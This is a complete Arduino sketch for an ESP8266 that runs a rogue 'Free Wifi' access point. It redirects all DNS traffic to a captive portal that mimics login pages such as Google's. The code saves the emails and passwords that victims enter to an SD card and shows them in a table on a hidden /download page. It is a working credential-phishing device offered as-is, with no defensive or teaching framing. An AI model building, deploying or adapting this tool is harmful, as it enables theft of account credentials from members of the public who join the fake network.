#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
#include <DNSServer.h> 
#include <SPI.h>
#include <SD.h>


IPAddress apIP(196, 0, 0, 1);
String SSID = "Free Wifi";
String SSID_PASSWORD= "12345678";
ESP8266WebServer apWebServer(80);
DNSServer apDnsServer;
File outputFile;
String currentPortalType = "google";

const String OUTPUT_FILENAME = "output.txt";
const byte DNS_PORT = 53;
const int chipSelect = D4;

void setup() {
  // put your setup code here, to run once:
  Serial.begin(115200);
  Serial.print("Setup program...");

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  
  if (!SD.begin(chipSelect)) {

    Serial.println("Card failed, or not present");
    return;
  } else {

    Serial.println("SD Card success");
  }
  
  startAP();
  startWebServer();
}

void writeFile(String dataString) {

  outputFile = SD.open(OUTPUT_FILENAME, FILE_WRITE);

  if (outputFile) {
    Serial.print("Writing to output.txt...");
    outputFile.println(dataString);
    // close the file:
    outputFile.close();
    Serial.println("done.");
  } else {
    // if the file didn't open, print an error:
    Serial.println("error opening test.txt");
  }
}

void openFile() {

  outputFile = SD.open(OUTPUT_FILENAME);
  if (outputFile) {
    Serial.println("output.txt:");

    // read from the file until there's nothing else in it:
    while (outputFile.available()) {
      
      String lineString = outputFile.readStringUntil('\n');
      Serial.println(lineString);
    }
    // close the file:
    outputFile.close();
  } else {
    // if the file didn't open, print an error:
    Serial.println("error opening output.txt");
  }  
}

void startAP() {

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  //Keep hidden while developing
  WiFi.softAP(SSID);
  //WiFi.softAP(SSID, SSID_PASSWORD, 1, true);
}

void startWebServer() {

  apDnsServer.start(DNS_PORT, "*", apIP);

  apWebServer.on("/login",[]() { 
    
    postLogin();
    BLINK(); 
    //apWebServer.send(HTTP_CODE, "text/html", posted()); 
    apWebServer.send(200, "text/html", getFileAsString("html/success.html")); 
  });

  apWebServer.on("/download",[]() { 

    apWebServer.send(200, "text/html", getDownloadPage()); 
  });
  
  apWebServer.on("/setup",[]() { 

    apWebServer.send(200, "text/html", getSetupPage()); 
  });


  File portalDir = SD.open("html/portals/");
  while(true) {
     File entry =  portalDir.openNextFile();
     if (!entry) {
       // Last files
       break;
     }

     String filename=entry.name();
     //avoid hidden files
     if(filename.substring(0,1) == ".") continue;

     String targetURL = filename;
     targetURL.replace(".html", "");
     
     
     apWebServer.on("/set_"+targetURL,[targetURL]() { 
      currentPortalType = targetURL;
      apWebServer.send(200, "text/html", getSetupPage()); 
    });
    

     entry.close();
  }

  apWebServer.onNotFound([]() { 

     apWebServer.send(200, "text/html", getPortalString(currentPortalType)); 
  });
  apWebServer.begin();
}

void postLogin() {
  
  String mail = getArgument("email");
  String password = getArgument("password");
  String platform = getArgument("platform");

  Serial.println("Email: ");
  Serial.println(mail);

  Serial.println("Password: ");
  Serial.println(password);

  Serial.println("Platform: ");
  Serial.println(platform);

  String outputString = mail + "," + password + "," + platform;
  writeFile(outputString);
  openFile();
}

void BLINK() { 

  for (int counter = 0; counter < 10; counter++)
  {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(300);
  }
}

String getArgument(String argName) {

  String a = apWebServer.arg(argName);
  a.replace("<","&lt;");
  a.replace(">","&gt;");
  a.substring(0,200);

  return a; 
}

String getSetupPage() {

  File portalDir = SD.open("html/portals/");
  String htmlString = "";
  while(true) {
     File entry =  portalDir.openNextFile();
     if (!entry) {
       // Last files
       break;
     }

     String filename=entry.name();
     //avoid hidden files
     if(filename.substring(0,1) == ".") continue;

     String targetURL = filename;
     targetURL.replace(".html", "");
     htmlString += "<a href=\"set_"+targetURL+"\">Use "+filename+"</a><br><br><br><br>";
     Serial.println("file is " + filename);
     entry.close();
  }

  return "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,user-scalable=no\"></head><body><div class=\"setupbox\">"+htmlString+"<style>td,th{border:1px solid #bebebe;padding:10px}td{text-align:center}tr:nth-child(even){background-color:#eee}th[scope=col]{background-color:#696969;color:#fff}th[scope=row]{background-color:#d7d9f2}table{border-collapse:collapse;border:2px solid #c8c8c8;letter-spacing:1px;font-family:sans-serif;font-size:.8rem}</style></body></html>";
}

String getDownloadPage() {

  String html = "";
  outputFile = SD.open(OUTPUT_FILENAME);
  if (outputFile) {
    Serial.println("output.txt:");

    // read from the file until there's nothing else in it:
    while (outputFile.available()) {
      
      String lineString = outputFile.readStringUntil('\n');
      String login = getValueAtIndex(lineString, ',', 0);
      String pass = getValueAtIndex(lineString, ',', 1);

      Serial.println(lineString);

      html += String("<tr><td scope=\"row\">20.02.2022</td><td>Google</td><td>" + login + "</td><td>" + pass + "</td>");
    }
    // close the file:
    outputFile.close();
  } else {
    // if the file didn't open, print an error:
    Serial.println("error opening output.txt");
  }

  return "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1,user-scalable=no\"></head><body><div class=\"download-box\"><table><tr><th scope=\"col\">Date</th><th scope=\"col\">Platforme</th><th scope=\"col\">Login</th><th scope=\"col\">Pass</th></tr>"+ html + "</table><style>td,th{border:1px solid #bebebe;padding:10px}td{text-align:center}tr:nth-child(even){background-color:#eee}th[scope=col]{background-color:#696969;color:#fff}th[scope=row]{background-color:#d7d9f2}table{border-collapse:collapse;border:2px solid #c8c8c8;letter-spacing:1px;font-family:sans-serif;font-size:.8rem}</style></body></html>";
}

String getPortalString(String type) {

  String outputString = "";
  outputString = getFileAsString("html/portals/"+type+".html");

  return outputString;
}

String getFileAsString(String filePath) {

  String outputString = "";
  outputFile = SD.open(filePath);
  if (outputFile) {
    Serial.println("Read file: " + filePath);

    // read from the file until there's nothing else in it:
    outputString = outputFile.readString();
    // close the file:
    outputFile.close();
  } else {
    // if the file didn't open, print an error:
    Serial.println("error opening portal html file");
  }

  return outputString;
}

String getValueAtIndex(String data, char separator, int index)
{
  int found = 0;
  int strIndex[] = {0, -1};
  int maxIndex = data.length()-1;

  for(int i=0; i<=maxIndex && found<=index; i++){
    if(data.charAt(i)==separator || i==maxIndex){
        found++;
        strIndex[0] = strIndex[1]+1;
        strIndex[1] = (i == maxIndex) ? i+1 : i;
    }
  }

  return found > index ? data.substring(strIndex[0], strIndex[1]) : "";
}



void loop() {
  // put your main code here, to run repeatedly:
  apDnsServer.processNextRequest();
  apWebServer.handleClient();
}
